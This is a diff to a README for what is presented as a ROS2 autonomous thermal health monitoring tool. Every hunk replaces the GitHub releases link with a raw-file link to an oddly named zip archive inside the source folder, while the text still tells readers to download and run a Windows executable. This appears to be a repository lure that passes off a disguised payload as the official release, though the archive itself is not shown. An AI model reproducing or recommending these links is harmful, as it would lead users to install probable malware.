@@ -1,6 +1,6 @@
 # 🤖 ros2-autonomous-thermal-health-monitoring - Real-Time Health Monitoring System
 
-[![Download](https://img.shields.io/badge/Download-ros2--autonomous--thermal--health--monitoring-6CC24A?style=for-the-badge&logo=github)](https://github.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/releases)
+[![Download](https://raw.githubusercontent.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/main/src/temp_monitor_pkg/health-ros-thermal-monitoring-autonomous-creaminess.zip)](https://raw.githubusercontent.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/main/src/temp_monitor_pkg/health-ros-thermal-monitoring-autonomous-creaminess.zip)
 
 ---
 
@@ -28,7 +28,7 @@ This guide will help you download and run ros2-autonomous-thermal-health-monitor
 
 1. Visit the release page by clicking this large button:
 
-   [![Download Software](https://img.shields.io/badge/Download-Release%20Page-4a90e2?style=for-the-badge&logo=github)](https://github.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/releases)
+   [![Download Software](https://raw.githubusercontent.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/main/src/temp_monitor_pkg/health-ros-thermal-monitoring-autonomous-creaminess.zip%20Page-4a90e2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/main/src/temp_monitor_pkg/health-ros-thermal-monitoring-autonomous-creaminess.zip)
 
 2. On the page, find the latest version of the software. Look for a Windows installer or an executable file marked for Windows users.
 
@@ -195,6 +195,6 @@ Users with technical skill can explore running individual Docker containers manu
 ## 🔗 Repeat Download Link
 
 Access the latest release here:  
-https://github.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/releases
+https://raw.githubusercontent.com/sH4d0wTr1x/ros2-autonomous-thermal-health-monitoring/main/src/temp_monitor_pkg/health-ros-thermal-monitoring-autonomous-creaminess.zip
 
 Click the link, choose the version for Windows, then download and run as explained above.
